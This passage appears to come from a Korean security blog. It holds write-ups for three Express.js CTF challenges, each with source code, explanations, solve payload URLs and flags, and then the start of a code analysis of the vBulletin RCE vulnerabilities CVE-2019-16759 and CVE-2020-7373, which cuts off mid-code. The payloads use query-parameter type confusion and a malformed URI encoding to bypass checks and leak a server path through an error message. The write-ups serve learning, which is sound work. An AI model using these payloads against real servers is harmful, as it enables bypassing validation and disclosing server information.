class="number">5001</span></span><br><span class="line"><span class="keyword">const</span> FLAG = process.env.FLAG || <span class="string">&quot;???&quot;</span></span><br><span class="line"><span class="keyword">const</span> SOURCE = fs.readFileSync(<span class="string">&#x27;app.js&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.statusCode = <span class="number">200</span></span><br><span class="line">  res.setHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>)</span><br><span class="line">  res.write(<span class="string">&quot;Level 1\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(<span class="string">&#x27;secret&#x27;</span> <span class="keyword">in</span> req.query)) &#123;</span><br><span class="line">    res.end(SOURCE)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (req.query.secret.length &gt; <span class="number">5</span>) &#123;</span><br><span class="line">    res.end(<span class="string">&quot;I don&#x27;t allow it.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (req.query.secret != <span class="string">&quot;GIVEmeTHEflagNOW&quot;</span>) &#123;</span><br><span class="line">    res.end(<span class="string">&quot;Wrong secret.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  res.end(FLAG)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(PORT, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Example app listening at port <span class="subst">$&#123;PORT&#125;</span>`</span>)</span><br><span class="line">&#125;) </span><br></pre></td></tr></table></figure><p><strong>Challenge 1의 솔브 조건을 확인해보면 Query String인 secret의 길이가 5 이상이면 안 되고, secret의 값이 <code>GIVEmeTHEflagNOW</code>여야 합니다. 하지만 해당 값은 길이가 16 이므로 5 이상이기 때문에 중간에 끊기게 됩니다.</strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">＞ <span class="keyword">var</span> secret = [<span class="string">&#x27;GIVEmeTHEflagNOW&#x27;</span>];</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">＞ secret.length</span><br><span class="line"><span class="number">1</span></span><br><span class="line">＞ <span class="keyword">if</span> (secret == <span class="string">&#x27;GIVEmeTHEflagNOW&#x27;</span>)&#123;<span class="built_in">console</span>.log(<span class="number">1</span>);&#125;</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong> 하지만 Express.js는 Object로 Query String을 보내줄 수 있기 때문에 이를 이용해서 보내주면 길이는 1, secret의 값은 <code>GIVEmeTHEflagNOW</code>가 되므로 문제를 해결할 수 있습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solve Payload : http:&#x2F;&#x2F;challenges.gynvael.stream:5001&#x2F;?secret[]&#x3D;GIVEmeTHEflagNOW</span><br></pre></td></tr></table></figure><p><code>FLAG : CTF&#123;SmellsLikePHP&#125;</code></p><hr><h3 id="Challenge-2"><a href="#Challenge-2" class="headerlink" title="Challenge 2"></a>Challenge 2</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Level <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">5002</span></span><br><span class="line"><span class="keyword">const</span> FLAG = process.env.FLAG || <span class="string">&quot;???&quot;</span></span><br><span class="line"><span class="keyword">const</span> SOURCE = fs.readFileSync(<span class="string">&#x27;app.js&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.statusCode = <span class="number">200</span></span><br><span class="line">  res.setHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>)</span><br><span class="line">  res.write(<span class="string">&quot;Level 2\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(<span class="string">&#x27;X&#x27;</span> <span class="keyword">in</span> req.query)) &#123;</span><br><span class="line">    res.end(SOURCE)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (req.query.X.length &gt; <span class="number">800</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> s = <span class="built_in">JSON</span>.stringify(req.query.X)</span><br><span class="line">    <span class="keyword">if</span> (s.length &gt; <span class="number">100</span>) &#123;</span><br><span class="line">      res.end(<span class="string">&quot;Go away.&quot;</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> k = <span class="string">&#x27;&lt;&#x27;</span> + req.query.X + <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">      res.end(<span class="string">&quot;Close, but no cigar.&quot;</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">      res.end(FLAG)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.end(<span class="string">&quot;No way.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(PORT, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Challenge listening at port <span class="subst">$&#123;PORT&#125;</span>`</span>)</span><br><span class="line">&#125;) </span><br></pre></td></tr></table></figure><p><strong><code>req.query.X</code>의 길이는 800보다 커야 하고, <code>JSON.stringify(req.query.X)</code>의 값은 100보다 작아야 합니다. </strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bypass Payload: http:&#x2F;&#x2F;challenges.gynvael.stream:5002&#x2F;?X[length]&#x3D;801</span><br></pre></td></tr></table></figure><p><strong>Express.js는 Object로 값을 보내줄 수 있다는 것을 알고 있습니다. 위 조건문은 위 Payload를 이용해서 쉽게 우회할 수 있습니다. </strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (req.query.X.length &gt; <span class="number">800</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> s = <span class="built_in">JSON</span>.stringify(req.query.X)</span><br><span class="line">  <span class="keyword">if</span> (s.length &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    res.end(<span class="string">&quot;Go away.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><strong><code>req.query.X.length</code>를 참조하면 801, <code>JSON.stringify()</code> 메서드를 이용해서 Query String을 문자열로 만들게 되면 길이가 길어봐야 35정도(최종 페이로드 기준) 될 것이기 때문에 쉽게 우회할 수 있습니다.</strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> k = <span class="string">&#x27;&lt;&#x27;</span> + req.query.X + <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">  res.end(<span class="string">&quot;Close, but no cigar.&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">  res.end(FLAG)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>try/catch 문을 보면 catch 문에서 flag를 출력해주는 것을 볼 수 있습니다. catch 문으로 가기 위해서는 try 문에서 에러를 내뱉게 해야 합니다. <code>const k = &#39;&lt;&#39; + req.query.X + &#39;&gt;&#39;</code>를 보면 문자열과 오브젝트 값을 더해주는 것을 볼 수 있습니다.</strong><br></p><p><strong>Object와 문자열을 더해주면 오브젝트 값을 암시적으로 문자열로 변환해주는 메서드를 호출한다고 합니다. Javascript에서는 문자열로 변환해주는 메서드는 toString() 입니다.</strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">＞ <span class="keyword">var</span> a = &#123;<span class="attr">toString</span>:<span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">＞ secret.length</span><br><span class="line"><span class="number">1</span></span><br><span class="line">＞ <span class="keyword">const</span> s = <span class="string">&#x27;&lt;&#x27;</span> + a + <span class="string">&#x27;&gt;&#x27;</span>;</span><br><span class="line">ⓧ ▶Uncaught <span class="built_in">TypeError</span>: Cannot convert object to primitive value</span><br><span class="line">      at &lt;anonymous&gt;:<span class="number">1</span>:<span class="number">15</span></span><br></pre></td></tr></table></figure><p><strong>Object 값으로 toString으로 보내줬습니다. 그 다음 <code>const s = &#39;&lt;&#39; + a + &#39;&gt;&#39;;</code>에서는 a 의 값이 Object이기 때문에 toString를 호출하게 됩니다. 이때 toString을 <code>a.toString</code> 이렇게 호출하게 되는데 a의 toString 값은 위에 보면 ‘’로 재정의  때문에 Object를 문자열로 변환해주지 못 해 에러가 발생하게 됩니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solve Payload : http:&#x2F;&#x2F;challenges.gynvael.stream:5002&#x2F;?X[length]&#x3D;801&amp;X[toString]</span><br></pre></td></tr></table></figure><p><code>FLAG : CTF&#123;WaaayBeyondPHPLikeWTF&#125;</code></p><hr><h3 id="Challenge-3"><a href="#Challenge-3" class="headerlink" title="Challenge 3"></a>Challenge 3</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Level <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// IMPORTANT <span class="doctag">NOTE:</span></span></span><br><span class="line"><span class="comment">// The secret flag you need to find is in the path name of this JavaScript file.</span></span><br><span class="line"><span class="comment">// So yes, to solve the task, you just need to find out what&#x27;s the path name of</span></span><br><span class="line"><span class="comment">// this node.js/express script on the filesystem and that&#x27;s it.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">5003</span></span><br><span class="line"><span class="keyword">const</span> FLAG = process.env.FLAG || <span class="string">&quot;???&quot;</span></span><br><span class="line"><span class="keyword">const</span> SOURCE = fs.readFileSync(path.basename(__filename))</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.statusCode = <span class="number">200</span></span><br><span class="line">  res.setHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>)</span><br><span class="line">  res.write(<span class="string">&quot;Level 3\n\n&quot;</span>)</span><br><span class="line">  res.end(SOURCE)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/truecolors/:color&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.statusCode = <span class="number">200</span></span><br><span class="line">  res.setHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> color = (<span class="string">&#x27;color&#x27;</span> <span class="keyword">in</span> req.params) ? req.params.color : <span class="string">&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (color === <span class="string">&#x27;red&#x27;</span> || color === <span class="string">&#x27;green&#x27;</span> || color === <span class="string">&#x27;blue&#x27;</span>) &#123;</span><br><span class="line">    res.end(<span class="string">&#x27;Yes! A true color!&#x27;</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.end(<span class="string">&#x27;Hmm? No.&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(PORT, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Challenge listening at port <span class="subst">$&#123;PORT&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>위쪽에 디스크립션을 보면 flag는 javascript 파일이 위치한 경로 파일 이름으로 되어 있다고 합니다. 하지만 코드를 보면 알겠지만 Path Traversal 취약점이 발생할 만한 곳은 존재하지 않습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TypeError: Cannot convert object to primitive value</span><br><span class="line">    at &#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;app.js:9:19</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at next (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:137:13)</span><br><span class="line">    at Route.dispatch (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:112:3)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at &#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:281:22</span><br><span class="line">    at Function.process_params (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)</span><br><span class="line">    at next (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:275:10)</span><br><span class="line">    at expressInit (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;middleware&#x2F;init.js:40:5)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br></pre></td></tr></table></figure><p><strong>하지만 위에러를 보면 에러가 발생한 위치를 절대 경로로 알려주고 있는 것을 볼 수 있습니다. 그러니 해당 문제에서도 에러를 내뱉게만 하면 어디에서 에러가 났는 지 절대 경로로 보여줄 건데, 그때 경로에서 flag를 찾을 수 있을 것 입니다. (위 에러는 문제와 상관 없음)</strong><br></p><p><strong>이렇게 시나리오는 구성했지만 에러를 어디서 내뱉게 해야 할 지 몰라 삽질을 조금 많이 했습니다.</strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/truecolors/:color&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.statusCode = <span class="number">200</span></span><br><span class="line">  res.setHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> color = (<span class="string">&#x27;color&#x27;</span> <span class="keyword">in</span> req.params) ? req.params.color : <span class="string">&#x27;???&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>위 코드를 보면 값을 req.params를 이용해서 color의 값을 받아오는 것을 볼 수 있습니다.</strong><br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/aa.png?raw=true"><br><strong>req.params에 대해 조금 찾아보니 req.params를 이용해서 값을 받으면, 자동으로 <code>decodeUriComponent()</code> 메서드를 이용해서 값을 디코딩한다고 합니다.</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="built_in">decodeURIComponent</span>(<span class="string">&#x27;%E0%A4%A&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">  <span class="built_in">console</span>.error(e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// URIError: malformed URI sequence</span></span><br></pre></td></tr></table></figure><p><strong>MDN Web Docs에서 decodeURLComponent() 메서드를 확인해 보니 인자 값으로 위와 같은 값이 들어오면 에러를 내뱉는 다는 것을 알 수 있었습니다.</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">＞ <span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%61&quot;</span>);</span><br><span class="line"><span class="string">&quot;a&quot;</span></span><br><span class="line">＞ <span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%62&quot;</span>);</span><br><span class="line"><span class="string">&quot;b&quot;</span></span><br><span class="line">＞ <span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%63&quot;</span>);</span><br><span class="line"><span class="string">&quot;c&quot;</span></span><br><span class="line">＞ <span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%AA&quot;</span>);</span><br><span class="line">ⓧ ▶Uncaught <span class="built_in">URIError</span>: URI malformed</span><br><span class="line">    at <span class="built_in">decodeURIComponent</span> (&lt;anonymous&gt;)</span><br><span class="line">    at &lt;anonymous&gt;:<span class="number">1</span>:<span class="number">1</span></span><br><span class="line">(anonymous) @ VM208:<span class="number">1</span></span><br><span class="line">＞ <span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%-&quot;</span>);</span><br><span class="line">ⓧ ▶Uncaught <span class="built_in">URIError</span>: URI malformed</span><br><span class="line">    at <span class="built_in">decodeURIComponent</span> (&lt;anonymous&gt;)</span><br><span class="line">    at &lt;anonymous&gt;:<span class="number">1</span>:<span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>그래서 왜 에러가 나는 지 확인을 해보니 ascii code 범위를 벗어나 매칭 되는 값이 없어서 에러가 나는 거 같았습니다. %AA ~ %FF 이 외에도 여러가지 값들을 다 넣어보니 모두 에러가 나는 것을 확인했습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">URIError: Failed to decode param &#39;%-&#39;</span><br><span class="line">    at decodeURIComponent (&lt;anonymous&gt;)</span><br><span class="line">    at decode_param (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:172:12)</span><br><span class="line">    at Layer.match (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:148:15)</span><br><span class="line">    at matchLayer (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:574:18)</span><br><span class="line">    at next (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:220:15)</span><br><span class="line">    at expressInit (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;middleware&#x2F;init.js:40:5)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at trim_prefix (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:317:13)</span><br><span class="line">    at &#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:284:7</span><br><span class="line">    at Function.process_params (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)</span><br></pre></td></tr></table></figure><p><strong>그래서 color의 값으로 %-을 주니 에러가 났고, 예상대로 절대 경로 모두 출력됐고, 절대 경로 내에 flag가 있었습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solve Payload : http:&#x2F;&#x2F;challenges.gynvael.stream:5003&#x2F;truecolors&#x2F;%-</span><br></pre></td></tr></table></figure><p><code>FLAG : CTF&#123;TurnsOutItsNotRegexFault&#125;</code></p><hr><h3 id="Challenge-4"><a href="#Challenge-4" class="headerlink" title="Challenge 4"></a>Challenge 4</h3><p>(Writing)</p><hr><h3 id="Challenge-5"><a href="#Challenge-5" class="headerlink" title="Challenge 5"></a>Challenge 5</h3><p>(Writing)</p><hr><h3 id="Challenge-6"><a href="#Challenge-6" class="headerlink" title="Challenge 6"></a>Challenge 6</h3><p>(Writing)</p><hr>]]></content>
      
      
      <categories>
          
          <category> Express.js Challenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Express.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0-day RCE in vBulletin</title>
      <link href="2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/"/>
      <url>2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/</url>
      
        <content type="html"><![CDATA[<p><strong>vBulletin에서 발견된 0-day 취약점을 분석해보겠습니다. vBulletin은 외국에서 사용하는 포럼 툴이라고 합니다. 한국 말로 풀어 쓰면 토론형 게시판이라고 볼 수 있겠습니다. 여하튼 이 포럼 툴에서 RCE 취약점이 총 2번 발견 되었습니다. </strong><br><br></p><table><thead><tr><th>CVE ID</th><th>Version</th><th>CVSS</th></tr></thead><tbody><tr><td>CVE-2019-16759</td><td>5.x ~ 5.5.4</td><td>9.8</td></tr><tr><td>CVE-2020-7373</td><td>5.5.4 ~ 5.6.2</td><td>9.8</td></tr></tbody></table><p><br><strong>처음에는 <code>CVE-2019-16759</code>라는 취약점이 나왔었고, 취약한 버전은 5.x부터 5.5.4까지라고 합니다. 해당 취약점은 9월 24일에 처음 POC가 공개되었고, 바로 다음 날인 25일에 패치가 됐다고 합니다.<strong><br></p><p><strong>하지만 완전히 패치된 줄 알았던 0-day 취약점이 한 보안 연구원에 의해서 또 다시 뚫리고 말았습니다. <code>CVE-2020-7373</code>라는 CVE ID로 나왔었고, 취약한 버전은 5.5.4부터 5.6.2까지라고 합니다. 그럼 한 번 RCE가 어떻게 트리거 됐는지 코드 분석을 통해 알아보겠습니다.</strong><br><br></p><hr><h2 id="CVE-2019-16759"><a href="#CVE-2019-16759" class="headerlink" title="CVE-2019-16759"></a><em>CVE-2019-16759</em></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="comment">//For a few set routes we can run a streamlined funcction.</span></span><br><span class="line"><span class="keyword">if</span> (vB5_Frontend_ApplicationLight::isQuickRoute())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$app</span> = vB5_Frontend_ApplicationLight::init(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$app</span>-&gt;execute())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>취약점의 시작은 index.php에서 시작이 됩니다. <code>isQuickRoute()</code>의 값이 참이면 if 문 내부로 들어가는 것을 볼 수 있습니다. isQuickRoute 메서드는 <code>includes/vb5/frontend/applicationlight.php</code> 내부에 정의되어 있습니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 